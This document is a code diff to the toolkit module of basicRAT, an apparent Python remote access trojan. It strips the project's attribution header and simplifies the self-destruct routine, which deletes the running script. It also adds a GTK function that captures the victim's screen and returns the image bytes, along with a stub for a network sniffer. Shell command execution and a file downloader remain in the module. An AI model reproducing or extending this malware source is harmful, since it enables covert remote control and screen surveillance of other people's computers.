@@ -1,7 +1,4 @@
-#
-# basicRAT toolkit module
-# https://github.com/vesche/basicRAT
-#
+# toolkit module
 
 import datetime
 import os
@@ -9,6 +6,7 @@ import subprocess
 import sys
 import urllib
 import zipfile
+import gtk
 
 
 def cat(file_path):
@@ -24,8 +22,8 @@ def cat(file_path):
 
 def execute(command):
     output = subprocess.Popen(command, shell=True,
-             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-             stdin=subprocess.PIPE)
+                              stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                              stdin=subprocess.PIPE)
     return output.stdout.read() + output.stderr.read()
 
 
@@ -46,26 +44,7 @@ def pwd():
     return os.getcwd()
 
 
-def selfdestruct(plat):
-    if plat == 'win':
-        import _winreg
-        from _winreg import HKEY_CURRENT_USER as HKCU
-
-        run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
-        try:
-            reg_key = _winreg.OpenKey(HKCU, run_key, 0, _winreg.KEY_ALL_ACCESS)
-            _winreg.DeleteValue(reg_key, 'br')
-            _winreg.CloseKey(reg_key)
-        except WindowsError:
-            pass
-
-    elif plat == 'nix':
-        pass
-
-    elif plat == 'mac':
-        pass
-
+def selfdestruct():
     # self delete basicRAT
     os.remove(sys.argv[0])
     sys.exit(0)
@@ -98,3 +77,26 @@ def wget(url):
         return 'Error: Download failed.'
 
     return 'File {} downloaded.'.format(fname)
+
+
+def screenshot():
+    w = gtk.gdk.get_default_root_window()
+    sz = w.get_size()
+    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB, False, 8, sz[0], sz[1])
+    pb = pb.get_from_drawable(w, w.get_colormap(), 0, 0, 0, 0, sz[0], sz[1])
+
+    if (pb != None):
+        pb.save("screenshot.png", "png")
+        try:
+            print ' in try no with '
+            imgFile = open("screenshot.png", "rb")
+            imgData = imgFile.read()
+            return imgData
+        except IOError:
+            return 'Error: Permission denied.'
+    else:
+        return "Unable to get the screenshot."
+
+
+def sniffer():
+    return
